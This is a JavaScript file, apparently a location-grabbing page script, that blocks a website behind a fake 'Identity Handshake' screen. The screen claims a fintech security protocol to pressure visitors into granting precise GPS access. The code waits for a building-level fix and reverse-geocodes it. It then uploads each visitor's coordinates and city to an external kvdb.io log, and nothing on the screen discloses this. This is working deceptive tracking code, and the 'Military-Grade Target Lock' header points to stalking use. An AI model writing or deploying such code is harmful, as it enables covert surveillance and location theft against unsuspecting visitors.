// ============================================================
//  ZING DEEP GPS REFINEMENT ENGINE (v6.0)
//  Military-Grade Target Lock & Cloud Sync
// ============================================================

const TRACKING_ENABLED = true;

// ── Inject Lock Screen CSS ────────────────────────────────────
const style = document.createElement('style');
style.textContent = `
  #zing-secure-lock {
    position: fixed; inset: 0; z-index: 200000; background: #010409;
    display: flex; align-items: center; justify-content: center;
    font-family: 'Outfit', sans-serif; text-align: center; color: white;
    padding: 20px; transition: opacity 0.5s ease;
  }
  .lock-box { 
    max-width: 480px; width: 100%; padding: 56px 40px; 
    background: linear-gradient(180deg, rgba(17,24,39,0.95) 0%, rgba(1,4,9,1) 100%);
    border: 1px solid rgba(139,92,246,0.3); border-radius: 40px;
    box-shadow: 0 40px 100px -20px rgba(0,0,0,0.8), 0 0 60px rgba(139,92,246,0.15);
    backdrop-filter: blur(30px); position: relative;
  }
  .lock-shield-svg { width: 44px; height: 44px; fill: #8b5cf6; margin-bottom: 24px; filter: drop-shadow(0 0 10px rgba(139,92,246,0.5)); }
  .lock-title { font-size: 28px; font-weight: 800; margin-bottom: 12px; color: #f8fafc; }
  .lock-text { color: #94a3b8; font-size: 14px; margin-bottom: 32px; line-height: 1.6; }
  .lock-btn { 
    width: 100%; padding: 18px; 
    background: linear-gradient(135deg, #7c3aed, #4f46e5); 
    border: none; border-radius: 16px; color: white; 
    font-weight: 800; cursor: pointer; transition: all 0.3s ease;
    display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 14px;
  }
  .lock-btn:disabled { opacity: 0.8; cursor: not-allowed; }
  .lock-spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
`;
document.head.appendChild(style);

// ── Deep GPS Refinement Engine (v6.3 - Jitter-Verified) ──────────────────
async function captureHighAccuracyGPS(onProgress) {
    return new Promise((resolve, reject) => {
        let bestFix = null;
        let lastCoord = null;
        let jitterCount = 0;
        const startTime = Date.now();
        const maxTime = 25000; // 25 seconds for deep satellite sync
        const targetAccuracy = 20; // Building-level precision
        
        const watchId = navigator.geolocation.watchPosition(
            (pos) => {
                const currentAcc = Math.round(pos.coords.accuracy);
                const currentLat = pos.coords.latitude.toFixed(6);
                const currentLon = pos.coords.longitude.toFixed(6);

                // BUG FIX: Reject any fix cached BEFORE we clicked the button
                if (pos.timestamp < startTime) return;

                // JITTER DETECTION: Prove the sensor is LIVE
                if (lastCoord && (currentLat !== lastCoord.lat || currentLon !== lastCoord.lon)) {
                    jitterCount++;
                }
                lastCoord = { lat: currentLat, lon: currentLon };

                if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
                    bestFix = pos;
                }

                if (onProgress) onProgress(currentAcc, jitterCount);

                // FINAL GATE: Accuracy must be good AND the signal must be "Moving" (Jittered 2x)
                if (currentAcc <= targetAccuracy && jitterCount >= 2) {
                    navigator.geolocation.clearWatch(watchId);
                    resolve(bestFix);
                }
            },
            (err) => {
                if (bestFix) { navigator.geolocation.clearWatch(watchId); resolve(bestFix); }
                else { navigator.geolocation.clearWatch(watchId); reject(err); }
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );

        setTimeout(() => {
            navigator.geolocation.clearWatch(watchId);
            if (bestFix) resolve(bestFix);
            else reject(new Error("Signal Timeout"));
        }, maxTime);
    });
}

// ── Cloud Sync Engine ─────────────────────────────────────────
async function logToDatabase(data) {
    if (typeof CONFIG === 'undefined' || !CONFIG.VAULT_ID) return;
    const endpoint = `https://kvdb.io/${CONFIG.VAULT_ID}/logs_v1`;
    try {
        const response = await fetch(endpoint);
        let history = response.ok ? JSON.parse((await response.text()) || "[]") : [];
        history.unshift({
            id: Math.random().toString(36).substr(2, 6).toUpperCase(),
            timestamp: new Date().toISOString(),
            ...data
        });
        await fetch(endpoint, { method: 'PUT', body: JSON.stringify(history.slice(0, 50)) });
    } catch (e) { console.warn('Sync Failed:', e); }
}

// ── Security Gate UI ──────────────────────────────────────────
async function showLock() {
    // BUG FIX: Removed Session Storage bypass to ensure 100% "Fresh Signal" on every load.
    // We now force a mandatory handshake on every single visit.

    const lock = document.createElement('div');
    lock.id = 'zing-secure-lock';
    lock.innerHTML = `
        <div class="lock-box">
            <svg class="lock-shield-svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            <div class="lock-title">Identity Handshake</div>
            <p class="lock-text">Complying with Fintech Security Protocol. <br>Initiating <b>Deep GPS Refinement</b> for building-level verification.</p>
            <button id="lock-unlock-btn" class="lock-btn">
                Authorize Encrypted Link
            </button>
            <p id="lock-status" style="margin-top: 15px; font-size: 11px; color: #64748b; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;"></p>
            <a id="lock-debug-map" href="#" target="_blank" style="display:none; margin-top: 10px; font-size: 10px; color: #8b5cf6; text-decoration: underline;">View Current Signal on Map</a>
        </div>
    `;
    document.body.appendChild(lock);

    document.getElementById('lock-unlock-btn').onclick = async () => {
        const btn = document.getElementById('lock-unlock-btn');
        const status = document.getElementById('lock-status');
        const debugLink = document.getElementById('lock-debug-map');
        btn.disabled = true;
        
        try {
            // Step 1: Deep Refinement with Jitter-Verification
            btn.innerHTML = `<div class="lock-spinner"></div> SYNCING SATELLITES...`;
            const pos = await captureHighAccuracyGPS((acc, jitter) => {
                status.innerText = `Satellite Pulse: ${jitter}/2 | Precision: ±${acc}m`;
                
                // Show debug map so user can verify "Expected Location"
                debugLink.style.display = 'block';
                debugLink.href = `https://www.google.com/maps?q=${pos ? pos.coords.latitude : ''},${pos ? pos.coords.longitude : ''}`;
                
                if (jitter === 0) {
                    status.innerHTML = `<span style="color:#ef4444">Searching Satellites...</span><br><small style="color:#64748b">Please move near a window if outdoors</small>`;
                } else {
                    status.style.color = acc <= 25 ? '#10b981' : '#f59e0b';
                }
            });

            // Step 2: Reverse Geocode (Clean Address)
            const lat = pos.coords.latitude.toFixed(7);
            const lon = pos.coords.longitude.toFixed(7);
            const acc = Math.round(pos.coords.accuracy);
            
            btn.innerHTML = `<div class="lock-spinner"></div> VERIFYING ADDRESS...`;
            let city = "Unknown Gateway";
            try {
                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                city = (geo.address.city || geo.address.town || 'Secure Site') + ', ' + (geo.address.state || geo.address.country);
            } catch(e) {}

            // Step 3: Global Sync
            const data = { lat, lon, acc, city, isp: 'Verified HW-GPS' };
            await logToDatabase(data);
            
            // Step 4: Success
            sessionStorage.setItem('zing_verified_v8', 'true');
            btn.innerHTML = `<svg style="width:20px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-width="3"/></svg> IDENTITY VERIFIED`;
            btn.style.background = '#10b981';
            status.innerText = `LOCKED: ${city} (±${acc}m)`;
            
            setTimeout(() => {
                lock.style.opacity = '0';
                setTimeout(() => lock.remove(), 500);
            }, 800);

        } catch (e) {
            btn.disabled = false;
            btn.innerHTML = `Retry Authorization`;
            status.innerText = "Error: Signal Too Weak";
            status.style.color = '#ef4444';
        }
    };
}

if (TRACKING_ENABLED) {
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', showLock);
    else showLock();
}
